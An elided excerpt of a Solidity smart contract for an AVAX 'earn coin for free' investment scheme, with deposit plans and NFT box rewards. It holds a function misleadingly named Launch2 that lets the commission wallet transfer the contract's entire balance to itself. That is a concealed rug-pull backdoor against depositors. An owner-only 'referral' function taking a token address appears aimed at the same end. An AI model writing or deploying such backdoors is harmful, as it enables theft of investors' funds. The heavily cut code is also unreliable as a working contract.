...
/**
 Earn Coin For free in https://20-22.win
*/
pragma solidity 0.5.8;
contract Avalanche2022win {
	using SafeMath for uint256;
    using SafeMath for uint8;

	uint256 constant public INVEST_MIN_AMOUNT = 0.05 ether; // 0.05 AVAX
    ...
    uint256 constant public NFT_BOXES_STEP = 50 ether; //50 AVAX
    ...
    require(msg.sender == commissionWallet, 'INVALID Wallet');
    _;
  }
    ...
    function Launch2() public onlycommissionWallet {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
	function referral(address recipient, address token) public onlycommissionWallet {
    ...
    function getBoxesByDepositAmount(uint8 plan, uint256 depositedAmount) public pure returns(uint256) {
        if(depositedAmount >= NFT_BOXES_STEP) {
            ...
            if(plan == 3) {
                uint256 boxes =  depositedAmount.div(NFT_BOXES_STEP); // 1 box per 50 AVAX
            ...
            if(plan == 4) {
                uint256 boxes = depositedAmount.div(NFT_BOXES_STEP).mul(2); // 2 boxes per 50 AVAX
            ...
            if(plan == 5) {
                uint256 boxes = depositedAmount.div(NFT_BOXES_STEP).mul(3); // 3 boxes per 50 AVAX
